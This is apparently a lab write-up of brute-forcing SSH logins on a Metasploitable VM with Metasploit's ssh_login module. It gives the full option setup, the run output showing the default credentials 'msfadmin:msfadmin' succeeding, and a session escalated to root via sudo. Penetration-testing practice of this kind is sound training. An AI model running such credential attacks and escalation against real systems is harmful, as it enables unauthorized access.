
Exploit Module: auxiliary/scanner/ssh/ssh_login
Rank: Excellent
Requirements:
1. Target IP Address (192.168.192.253 in this case)
2. Target Port (22 in this case)
3. PASS_FILE (password file)
4. USER_FILE (username file)

#### 1.Fulfilling Requirements:

```
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true             no        Create a new session for every successful login
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.192.253
RHOSTS => 192.168.192.253
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/alice/Documents/passwords.txt
PASS_FILE => /home/alice/Documents/passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /home/alice/Documents/usernames.txt
USER_FILE => /home/alice/Documents/usernames.txt


```


#### 2. Running the attack

```
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.168.192.253:22 - Starting bruteforce
[+] 192.168.192.253:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 3 opened (192.168.192.32:39473 -> 192.168.192.253:22) at 2024-12-03 00:11:43 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  3         shell linux  SSH alice @  192.168.192.32:39473 -> 192.168.192.253:22 (192.168.192.253)

msf6 auxiliary(scanner/ssh/ssh_login) > session -i 3
[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 3
[*] Starting interaction with 3...

whoami
msfadmin
sudo su
[sudo] password for msfadmin: msfadmin

whoami
root
ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:04:86:44  
          inet addr:192.168.192.253  Bcast:192.168.192.255  Mask:255.255.255.0
          inet6 addr: 2402:3a80:4280:6e36:a00:27ff:fe04:8644/64 Scope:Global
          inet6 addr: fe80::a00:27ff:fe04:8644/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2432 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2455 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:233089 (227.6 KB)  TX bytes:355349 (347.0 KB)
          Base address:0xd020 Memory:f0200000-f0220000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:610 errors:0 dropped:0 overruns:0 frame:0
          TX packets:610 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:273197 (266.7 KB)  TX bytes:273197 (266.7 KB)

exit

exit

[*] 192.168.192.253 - SSH session 3 closed.  Reason: User exit

```


Exploit Successful!